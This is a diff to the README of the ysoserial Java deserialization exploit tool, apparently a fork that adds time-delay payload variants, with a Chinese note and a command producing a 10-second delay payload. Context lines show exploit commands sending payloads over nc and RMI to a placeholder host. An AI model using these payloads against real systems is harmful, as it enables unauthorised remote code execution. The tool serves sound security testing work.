@@ -96,6 +96,22 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
+## Update
+新增时间延迟payload
+CommonsBeanutils1_Time
+CommonsCollections1_Time
+CommonsCollections2_Time
+CommonsCollections3_Time
+CommonsCollections4_Time
+CommonsCollections5_Time
+CommonsCollections6_Time
+Jdk7u21_Time
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_Time 10000 #延迟10s
+```
+
+
+
 ## Installation
 
 1. Download the latest jar from
